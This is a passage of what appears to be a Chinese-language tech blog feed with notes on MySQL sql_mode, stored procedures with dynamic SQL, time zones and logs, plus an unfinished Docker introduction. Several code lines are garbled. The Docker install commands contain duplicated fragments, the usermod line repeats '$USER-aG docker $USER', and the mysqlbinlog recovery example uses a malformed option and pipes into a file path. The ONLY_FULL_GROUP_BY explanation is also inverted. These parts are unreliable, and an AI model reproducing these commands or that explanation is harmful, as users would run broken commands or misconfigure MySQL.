服务</li><li>确定所要更新的Mysql 版本</li></ul><p>做好以上三件事之后，就可以开始升级了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ brew search mysql</span><br><span class="line">mysql@5.7 ✔</span><br><span class="line">$ brew upgrade mysql@5.7</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>终于安装好之后，再次开启Mysql 的服务，我发现还是没有解决我的问题，还是会提示相同的错误。</p><p>这时候我才意识到这个问题和Mysql 的版本没有关系，有关系应该是相关的模块。</p><p>通过查阅一番资料，才发现是因为 <code>group by</code> 中的列一定要出现在 <code>select</code> 中，除非强制 <code>sqlmode</code> 中使用 <code>ONLY_FULL_GROUP_BY</code>。</p><h2 id="开启sql-mode-模式"><a href="#开启sql-mode-模式" class="headerlink" title="开启sql-mode 模式"></a>开启sql-mode 模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnf</span><br><span class="line"></span><br><span class="line"># 增加如下内容</span><br><span class="line">[mysqld]</span><br><span class="line">sql_mode&#x3D;&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#39;;</span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line">[mysqld]</span><br><span class="line">sql_mode &#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure><p>重启Mysql 服务器，即可。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/36829911/how-to-resolve-order-by-clause-is-not-in-select-list-caused-mysql-5-7-with-sel/39353160" target="_blank" rel="noopener"> 如何解决 MySQL 5.7带有SELECT DISTINCT和ORDER BY的问题 | stack voerflow </a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/sql-mode.html" target="_blank" rel="noopener">Mysql 服务器SQL 模式</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 存储过程入门</title>
      <link href="/getting-started-with-mysql-stored-procedures/"/>
      <url>/getting-started-with-mysql-stored-procedures/</url>
      
        <content type="html"><![CDATA[<p>最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。</p><p>应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。</p><a id="more"></a><p>以下两点是其中比较重要的部分：</p><ol><li>关于变量的使用</li><li>在存储过程中使用动态SQL 语句</li></ol><h2 id="存储过程中的变量"><a href="#存储过程中的变量" class="headerlink" title="存储过程中的变量"></a>存储过程中的变量</h2><p>MySQL存储过程常见的变量：局部变量、用户变量、系统变量。</p><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>在过程体中，可以声明局部变量，用来临时保存一些值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECLARE  var_name[, var_name] ...  type [DEFAULT value];</span><br></pre></td></tr></table></figure><p>其中，type为MySQL的数据类型，如:int、float、date、varchar(length) 。</p><p>使用局部变量时，需要注意以下两点：</p><ol><li>DECLARE用来声明局部变量，且DECLARE仅被用在BEGIN … END复合语句里，并且必须在复合语句的开头，在任何其它语句之前；可以被用在嵌套的块中，除了那些用相同名字声明变量的块。</li><li>如果要给变量提供一个默认值，使用DEFAULT子句(值可以是常数，也可以指定为一个表达式)；如果没有DEFAULT子句，初始值为NULL。</li></ol><h3 id="用户变量"><a href="#用户变量" class="headerlink" title="用户变量"></a>用户变量</h3><p>用户变量与数据库连接有关：在当前连接中声明的变量，在连接断开的时候，就会消失；在此连接中声明的变量无法在另一连接中使用。</p><p>用户变量使用<code>@</code>关键字去定义。</p><h2 id="在存储过程中动态执行SQL"><a href="#在存储过程中动态执行SQL" class="headerlink" title="在存储过程中动态执行SQL"></a>在存储过程中动态执行SQL</h2><p>其实这个理解成一套模版，只要按照标准去执行这套模版，就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">-- 连接数据库</span><br><span class="line">use databaseName;</span><br><span class="line">-- 定义结束符为 $$</span><br><span class="line">delimiter $$</span><br><span class="line">-- 判断是否存在该名称的存储过程，如果存在就删除</span><br><span class="line">drop procedure if exists wk;</span><br><span class="line">-- 创建新的存储过程</span><br><span class="line">create procedure wk()</span><br><span class="line">begin</span><br><span class="line">        -- 声明变量</span><br><span class="line">        declare days int default 366;</span><br><span class="line">        declare dates int;</span><br><span class="line">-- 循环体</span><br><span class="line">WHILE days - 1 &gt; 0 DO</span><br><span class="line">        -- 为变量赋值</span><br><span class="line">    SET dates &#x3D; DATE_FORMAT(DATE_SUB(CURDATE(), INTERVAL dayofyear(now())- days DAY), &quot;%Y%m%d&quot;);</span><br><span class="line">SET days &#x3D; days - 1;</span><br><span class="line">-- 拼接表名</span><br><span class="line">set @table_name &#x3D; CONCAT(&quot;tableName&quot;, dates);</span><br><span class="line">        -- 拼接需要执行SQL 语句，后面的内容需要根据实际情况替换掉</span><br><span class="line">        SET @sql &#x3D; CONCAT(&quot;ALTER TABLE &quot;, @table_name, &quot;</span><br><span class="line">          -- 需要执行的SQL </span><br><span class="line">          &quot;);</span><br><span class="line">        -- 预处理动态SQL 语句，其中stmt 是一个变量</span><br><span class="line">        PREPARE stmt FROM @sql;</span><br><span class="line">        -- 执行SQL 语句</span><br><span class="line">        EXECUTE stmt ;</span><br><span class="line">        -- 释放prepare</span><br><span class="line">        deallocate prepare stmt;</span><br><span class="line">-- 结束循环</span><br><span class="line">end WHILE;</span><br><span class="line">-- 结束定义语句</span><br><span class="line">end $$</span><br><span class="line">delimiter ;</span><br><span class="line">call wk();</span><br></pre></td></tr></table></figure><p>大致上就是这样，至此，一个完整的Mysql 存储过程就完成了。</p><blockquote><p>如何在终端执行Mysql 文件？</p></blockquote><p>SQL 脚本准备好了，有两种方式可以执行它。</p><ol><li>方式一：不进入Mysql 终端，直接在命令行终端执行</li><li>方式二：进入Mysql 终端，在Mysql 终端中执行</li></ol><p>这两种方式的共同点就是都需要已知Mysql 密码。</p><p>对于方式一，可以使用以下命令来执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p &lt; .&#x2F;modify_user_table.sql</span><br></pre></td></tr></table></figure><p>可以指定数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p databaseName &lt; .&#x2F;modify_user_table.sql</span><br></pre></td></tr></table></figure><p>对于方式二，可以使用以下命令来执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 进入Mysql 终端</span><br><span class="line">mysql -uroot -p </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 执行SQL 文件</span><br><span class="line">source .&#x2F;modify_user_table.sql</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://pein0119.github.io/2014/10/22/MySQL%E7%BB%88%E7%AB%AF%E6%89%A7%E8%A1%8CSQL%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">Mysql 终端执行SQL 文件</a></li><li><a href="https://www.cnblogs.com/geaozhang/p/6803423.html" target="_blank" rel="noopener">Mysql 存储过程中的变量定义</a></li><li><a href="https://www.cnblogs.com/easonjim/p/7966918.html" target="_blank" rel="noopener">Mysql 中的变量定义和赋值</a></li><li><a href="https://my.oschina.net/u/2331760/blog/3065637" target="_blank" rel="noopener">Mysql 存储过程中使用动态SQL 语句</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 查看修改默认时区</title>
      <link href="/mysql-view-and-modify-the-default-time-zone/"/>
      <url>/mysql-view-and-modify-the-default-time-zone/</url>
      
        <content type="html"><![CDATA[<p>在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。</p><p>这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。</p><a id="more"></a><h3 id="查看默认时区"><a href="#查看默认时区" class="headerlink" title="查看默认时区"></a>查看默认时区</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;%time_zone%&quot;;</span><br><span class="line">+------------------+--------+</span><br><span class="line">| Variable_name    | Value  |</span><br><span class="line">+------------------+--------+</span><br><span class="line">| system_time_zone | CST    |</span><br><span class="line">| time_zone        | SYSTEM |</span><br><span class="line">+------------------+--------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><h3 id="设置默认时区"><a href="#设置默认时区" class="headerlink" title="设置默认时区"></a>设置默认时区</h3><h4 id="设置当前会话"><a href="#设置当前会话" class="headerlink" title="设置当前会话"></a>设置当前会话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET time_zone &#x3D; &quot;+8.00&quot;;</span><br><span class="line">mysql&gt; show variables like &quot;%time_zone%&quot;;</span><br></pre></td></tr></table></figure><p>此修改只会对当前会话有效。</p><h4 id="全局设置"><a href="#全局设置" class="headerlink" title="全局设置"></a>全局设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET global time_zone &#x3D; &quot;+8.00&quot;;</span><br></pre></td></tr></table></figure><p>需要重启该会话，该配置才生效。</p><h4 id="编辑-my-ini"><a href="#编辑-my-ini" class="headerlink" title="编辑 my.ini"></a>编辑 my.ini</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 打开Mysql 的配置文件 my.ini</span><br><span class="line">[mysqld]</span><br><span class="line">default-time_zone &#x3D; &#39;+8:00&#39;</span><br></pre></td></tr></table></figure><p>需要重启Mysql 服务</p><h5 id="时间格式"><a href="#时间格式" class="headerlink" title="时间格式"></a>时间格式</h5><p>GMT（Greenwich Mean Time）：格林威治标准时间<br>UTC：世界标准时间<br>CST（China Standard Time）：中国标准时间</p><p>GMT + 8 = UTC + 8 = CST</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://majing.io/posts/10000004161181" target="_blank" rel="noopener">Mysql 查看修改时区 time_zone</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解 Mysql 日志</title>
      <link href="/understanding-the-mysql-log/"/>
      <url>/understanding-the-mysql-log/</url>
      
        <content type="html"><![CDATA[<p>日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。</p><a id="more"></a><h2 id="日志简介"><a href="#日志简介" class="headerlink" title="日志简介"></a>日志简介</h2><p>Mysql 的日志主要分为四类，使用这些日志文件，可以查看Mysql 内部发生的事情，这四类日志分别是：</p><ul><li>错误日志：记录Mysql 服务的启动、运行或停止Mysql服务时出现的问题。</li><li>查询日志：记录建立的客户端连接和执行的语句。</li><li>二进制日志：记录所有更改数据的语句，可以用于数据恢复。</li><li>慢查询日志：记录所有执行时间超过 long_query_time 的所有查询或不使用索引的查询。</li></ul><h3 id="二进制日志"><a href="#二进制日志" class="headerlink" title="二进制日志"></a>二进制日志</h3><p>二进制日志主要记录 Mysql 数据库的变化。二进制日志以一种有效的格式，并且是事务安全的方式包含更新日志中可用的所有信息。</p><h4 id="启动和设置二进制日志"><a href="#启动和设置二进制日志" class="headerlink" title="启动和设置二进制日志"></a>启动和设置二进制日志</h4><p>默认情况下，二进制日志是关闭的，可以通过修改mysql 的配置文件来启动和设置二进制日志。</p><p>配置文件 my.ini 中有几个设置是关于二进制日志的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 如果需要启用，就在 mysqld 组下，加上 log-bin 选项</span><br><span class="line">[mysqld]</span><br><span class="line">log-bin</span><br><span class="line"></span><br><span class="line">log-bin [&#x3D;path&#x2F; [filename] ]</span><br><span class="line">expire_logs_days &#x3D; 10</span><br><span class="line">max_binlog_size &#x3D; 100M</span><br></pre></td></tr></table></figure><ol><li><code>log-bin</code>定义开启二进制日志，path 表示日志文件所在的目录路径，filename 指定了日志文件的名称。</li><li><code>expire_logs_days</code>定义了Mysql 清除过期日志的时间，即二进制日至的自动删除的天数。</li><li><code>max_binlog_size</code>定义了单个文件的大小限制，不能将变量设置为大于1GB或者小于4096B。默认值为1GB.</li></ol><blockquote><p>如何检查自己的二进制日志是否开启了呢？</p></blockquote><p>输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;log_%&#39;;</span><br></pre></td></tr></table></figure><h4 id="查看二进制日志"><a href="#查看二进制日志" class="headerlink" title="查看二进制日志"></a>查看二进制日志</h4><p>查看二进制文件个数及文件名，前提是开启了二进制日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show binary logs;</span><br></pre></td></tr></table></figure><h4 id="删除二进制日志"><a href="#删除二进制日志" class="headerlink" title="删除二进制日志"></a>删除二进制日志</h4><p>Mysql 也为我们提供了删除二进制日志的方法，有两种，作用不相同。</p><p>删除所有二进制日志文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; RESET MASTER;</span><br></pre></td></tr></table></figure><p>删除指定二进制日志文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 其中，binlog.000003 是指二进制文件的名称</span><br><span class="line">mysql&gt; PURGE MASTER LOGS TO &quot;binlog.000003&quot;;</span><br></pre></td></tr></table></figure><h4 id="使用二进制日志恢复数据库"><a href="#使用二进制日志恢复数据库" class="headerlink" title="使用二进制日志恢复数据库"></a>使用二进制日志恢复数据库</h4><p>如果启用了Mysql 的二进制日志，在数据库出现意外丢失数据时，可以使用 Mysqlbinlog 工具从指定时间点开始（例如，最后一次备份）直到现在。</p><p>Mysqlbinlog 恢复数据库的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysqlbinlog [option] filename | mysql -uuser -ppass</span><br></pre></td></tr></table></figure><p>实例：使用Mysqlbinlog 恢复Mysql 数据库到2019年1月30日15:27:48时的状态，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlbinlog --stop--date&#x3D;&quot;2019-01-30 15:27:48&quot; | path&#x2F;binlogfilename -uuser -ppass</span><br></pre></td></tr></table></figure><h4 id="暂停二进制日志功能"><a href="#暂停二进制日志功能" class="headerlink" title="暂停二进制日志功能"></a>暂停二进制日志功能</h4><p>因为修改Mysql 配置文件可以启用、停用二进制日志功能，但是需要重启Mysql 服务器。Mysql 为我们提供了一种更简单的方式可以暂停记录二进制日志。</p><p>暂停记录二进制日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET sql_log_bin &#x3D; 0;</span><br></pre></td></tr></table></figure><p>恢复记录二进制日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET sql_log_bin &#x3D; 1;</span><br></pre></td></tr></table></figure><h3 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h3><p>错误日志文件包含了当Mysqld 启动和停止时，以及服务器在运行过程中发生任何严重错误时的相关信息。错误日志默认是开启的。</p><h4 id="启动和设置错误日志"><a href="#启动和设置错误日志" class="headerlink" title="启动和设置错误日志"></a>启动和设置错误日志</h4><p>通过修改my.ini 配置文件，来启用或者停用错误日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 如果需要启用，就在 mysqld 组下，加上 log-error 选项</span><br><span class="line">[mysqld]</span><br><span class="line">log-error</span><br><span class="line"></span><br><span class="line">log-error&#x3D;[path&#x2F;filename]</span><br></pre></td></tr></table></figure><h4 id="查看错误日志"><a href="#查看错误日志" class="headerlink" title="查看错误日志"></a>查看错误日志</h4><p>首先使用如下命令查看错误日志的存储路径以及文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;log_error&#39;;</span><br></pre></td></tr></table></figure><h4 id="删除错误日志文件"><a href="#删除错误日志文件" class="headerlink" title="删除错误日志文件"></a>删除错误日志文件</h4><p>Mysql 的错误日志文件是以文本文件的形式存储在文件系统中，可以直接删除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; flush logs;</span><br></pre></td></tr></table></figure><h3 id="通用查询日志"><a href="#通用查询日志" class="headerlink" title="通用查询日志"></a>通用查询日志</h3><p>通用查询日志记录了Mysql 的所有操作，包括启动和关闭服务、执行查询和更新语句等。</p><h4 id="启用和设置通用查询日志"><a href="#启用和设置通用查询日志" class="headerlink" title="启用和设置通用查询日志"></a>启用和设置通用查询日志</h4><p>同样的，打开Mysql 的my.ini 配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log</span><br><span class="line"></span><br><span class="line">log&#x3D;[path\filename]</span><br></pre></td></tr></table></figure><p>这里有两种方式，log 选项后面如果没有带任何参数表示使用Mysql 默认的存储位置，上面的也一样。</p><h4 id="查看通用查询日志"><a href="#查看通用查询日志" class="headerlink" title="查看通用查询日志"></a>查看通用查询日志</h4><p>可以通过log 设置的日志文件存储路径，去查看具体文件。</p><h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p>慢查询日志记录查询时长超过指定时间的日志。通过慢查询日志，可以找出执行时间较长、执行效率较低的语句，然后进行优化。</p><h4 id="启用和设置慢查询日志"><a href="#启用和设置慢查询日志" class="headerlink" title="启用和设置慢查询日志"></a>启用和设置慢查询日志</h4><p>同样的，打开编辑Mysql 的my.ini 配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log-slow-queries</span><br><span class="line"></span><br><span class="line">log-slow-queries&#x3D;[path\filename]</span><br><span class="line">long_query_time&#x3D;n</span><br></pre></td></tr></table></figure><p>n 表示查询时间的极限值，如果超过了这个值，这个查询过程就会被记录到慢查询日志文件中。</p><p>查询慢查询日志同上。</p><p>上面这些日志配置的更改都需要重启服务器才能生效，另外还有一种方式可以查看运行时日志。</p><h3 id="启用实时日志"><a href="#启用实时日志" class="headerlink" title="启用实时日志"></a>启用实时日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; on;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 查看日志文件目录</span><br><span class="line">show variables like &#39;general_log_file&#39;;</span><br></pre></td></tr></table></figure><p>这种方式的好处就是不需要重启Mysql 服务。</p><p>如果需要禁用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; off;</span><br></pre></td></tr></table></figure><blockquote><p>关于平时应该打开哪些日志的问题。</p></blockquote><p>日志的开启既会影响Mysql 的性能，又会占用大量的磁盘空间。<br>因此如果不必要，应尽可能的少开启日志，根据不同的使用环境，考虑开启不同的日志。</p><p>例如：在开发环境中优化查询低效率的语句，可以开启慢查询日志；<br>如果需要记录用的所有查询操作，可以开启通用查询日志；<br>如果需要记录数据的变更，可以开启二进制日志；<br>错误日志默认开启；</p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 快速上手</title>
      <link href="/docker-quick-start/"/>
      <url>/docker-quick-start/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记的主要目的是用来记录学习 <code>Docker</code> 的过程。<code>Docker</code>这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。</p><a id="more"></a><h2 id="诞生"><a href="#诞生" class="headerlink" title="诞生"></a>诞生</h2><p>软件开发最大的麻烦事之一，就是环境配置。</p><p>开发者常常说的一句话：它在我的机器上可以跑了。言下之意就是，其他机器可能跑不了。因为可以正常跑的前提是：操作系统的设置，各种软件和组件、库的安装，只有它们都正确了，软件才能正常运行。</p><p>配置环境如此麻烦，换一台机器，就得重来一次，旷日费时。因此，聪明的人们就想到，能不能从根本上解决问题。软件可以带环境安装。（这里说的软件是指最终要运行的工程）</p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>虚拟机（virtual machine，简称VM）就是带环境安装的一种解决方案。它可以在一个操作系统中运行另外一种操作系统。比如在Windows系统中运行Linux 系统。应用程序对此毫无感觉，因为虚拟机看上去跟真是系统一模一样。而对于底层系统来说，虚拟机就是一个普通文件，不需要就删掉，对其他部分没有影响。</p><p><strong>虚拟机（VM）是物理硬件的抽象，</strong> 将一台服务器转变为多台服务器。</p><p>虽然用户可以通过虚拟机还原软件的原始环境，但是这个方案有几个缺点。在后面会做比较。</p><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>由于虚拟机存在一些缺点，Linux 发展出了另一种轻量级的操作系统虚拟化解决方案，Linux 容器（Linux Containers，缩写为 LXC）。</p><p><strong>Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。</strong></p><p><strong>容器是应用层的抽象，它将代码和依赖关系打包在一起。</strong> 多个容器可以在同一台机器上运行，并与其他容器共享操作系统内核，每个容器在用户空间中作为独立进程运行。容器占用的空间比VM少（容器映像的大小通常为几十MB），可以处理更多的应用程序，并且需要更少的VM和操作系统。</p><p>由于容器是进程级别的，相比虚拟机有很多的优势。后面会做比较。</p><h2 id="Docker-是什么"><a href="#Docker-是什么" class="headerlink" title="Docker 是什么"></a>Docker 是什么</h2><p><strong>Docker 属于Linux 容器的一种封装，提供简单易用的容器使用接口。</strong> 它是目前最流行的 Linux 容器解决方案。</p><h3 id="Docker-与虚拟机的区别"><a href="#Docker-与虚拟机的区别" class="headerlink" title="Docker 与虚拟机的区别"></a>Docker 与虚拟机的区别</h3><table><thead><tr><th>名称</th><th>占用资源</th><th>启动速度</th><th>级别</th></tr></thead><tbody><tr><td>Docker</td><td>占用资源少</td><td>启动快</td><td>轻量级</td></tr><tr><td>虚拟机</td><td>占用资源多</td><td>启动慢</td><td>重量级</td></tr></tbody></table><h3 id="Docker-CE-与-Docker-EE"><a href="#Docker-CE-与-Docker-EE" class="headerlink" title="Docker CE 与 Docker EE"></a>Docker CE 与 Docker EE</h3><p><strong>Docker CE(Docker Community Edition)</strong> 是社区版，简单理解是免费使用，提供小企业与小的IT团队使用,希望从Docker开始，并尝试基于容器的应用程序部署。</p><p><strong>Docker EE(Docker Enterprise Edition)</strong> 是企业版，收费。提供功能更强。适合大企业与打的IT团队。为企业开发和IT团队设计，他们在生产中构建、交付和运行业务关键应用程序</p><p>Docker CE 有三种类型的更新通道：stable、test和 nightly</p><ul><li>Stable 提供一般可用性的最新版本</li><li>Test 提供在一般可用之前准备好进行测试的预发布。</li><li>Nightly 提供下一个主要版本的最新正在进行的工作。</li></ul><h2 id="安装-Docker-CE"><a href="#安装-Docker-CE" class="headerlink" title="安装 Docker-CE"></a>安装 Docker-CE</h2><p>这里以Ubuntu 18.04 为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. sudo apt install apt-transport-https ca-certificates software-properties-common curl-transport-https ca-certificates software-properties-common curl</span><br><span class="line">2. curl -fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add --fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -</span><br><span class="line">3. sudo add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \</span><br><span class="line">$(lsb_release -cs) stable&quot;</span><br><span class="line">4. sudo apt update</span><br><span class="line">5. sudo apt install docker-ce</span><br></pre></td></tr></table></figure><p>将当前用户添加到docker 用户组，可以不用sudo 运行docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo groupadd docker</span><br><span class="line">$ sudo usermod -aG docker $USER-aG docker $USER</span><br></pre></td></tr></table></figure><h3 id="Docker-镜像"><a href="#Docker-镜像" class="headerlink" title="Docker 镜像"></a>Docker 镜像</h3><p>Docker 镜像就是一个只读的模板。</p><p>例如：一个镜像可以包含一个完整的 ubuntu 操作系统环境，里面仅安装了 Apache 或用户需要的其它应用程序。</p><p>镜像可以用来创建 Docker 容器。</p><h3 id="Docker-容器"><a href="#Docker-容器" class="headerlink" title="Docker 容器"></a>Docker 容器</h3><p>Docker 利用容器来运行应用。</p><p>容器是从镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。</p><p>可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p><blockquote><p>注：镜像是只读的，容器在启动的时候创建一层可写层作为最上层。</p></blockquote><h3 id="Docker-仓库"><a href="#Docker-仓库" class="headerlink" title="Docker 仓库"></a>Docker 仓库</h3><p>仓库是集中存放镜像文件的场所。有时候会把仓库和仓库注册服务器（Registry）混为一谈，并不严格区分。实际上，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像（image），每个镜像有不同的标签（tag）。</p><p>仓库分为公开仓库（Public）和私有仓库（Private）两种形式。</p><p>最大的公开仓库是 Docker Hub，存放了数量庞大的镜像供用户下载。 国内的公开仓库包括 Docker Pool 等，可以提供大陆用户更稳定快速的访问。</p><p>当然，用户也可以在本地网络内创建一个私有仓库。</p><p>当用户创建了自己的镜像之后就可以使用 push 命令将它上传到公有或者私有仓库，这样下次在另外一台机器上使用这个镜像时候，只需要从仓库上 pull 下来就可以了。</p><blockquote><p>注：Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。</p></blockquote><h4 id="镜像和容器的区别"><a 